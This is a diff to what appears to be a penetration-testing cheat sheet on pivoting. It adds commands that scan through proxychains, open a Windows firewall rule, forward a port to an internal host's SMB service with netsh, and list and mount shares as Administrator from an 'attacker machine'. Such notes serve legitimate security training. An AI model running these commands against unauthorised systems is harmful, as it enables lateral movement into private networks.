@@ -2411,12 +2411,31 @@ sudo ssh -N -D 127.0.0.1:4444 user@10.10.10.10 # open port 4444 and forward to 1
 Edit /etc/proxychains.conf 
 ```
 echo "socks 4 127.0.0.1 4444" >> /etc/proxychains.conf
-sudo proxychains nmap 10.10.10.12 # scan 10.10.10.12 through 10.10.10.10
+sudo proxychains nmap -sT -Pn 10.10.10.12 # scan 10.10.10.12 through 10.10.10.10
 ```
-## Windows: PLINK
+## Windows Tools
+### Plink
 * [plink](http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
 ```
 plink.exe -ssh -l username -pw password -R 10.10.10.10:4444:127.0.0.1:3306 10.10.10.10
 # avoid prompt 'Store key in cache?'
 cmd.exe /c echo y | plink.exe -ssh -l username -pw password -R 10.10.10.10:4444:127.0.0.0:3306 10.10.10.10
+```
+
+### netsh
+! SYSTEM privilege required
+
+Update Windows Firewall since incoming requests are most likely blocked
+```
+netsh advfirewall firewall add rule name="foward_port_rule" protocol=TCP dir=in localip=10.10.10.10 localport=4444 action=allow
+```
+Port Forward
+```
+netsh interface portproxy add v4tov4 listenport=4444 listenaddress=10.10.10.10 connectport=445 connectaddress=192.168.1.10
+```
+Example: List SMB shares (from attacker machine, victim=10.10.10.10, hostToConnect=192.168.1.10)
+```
+smbclient -L 10.10.10.10 --port=4444
+# mount share
+sudo mount -t cifs -o port=4444 //10.10.10.10/Share -o username=Administrator,password=passwd! /mnt/share
 ```
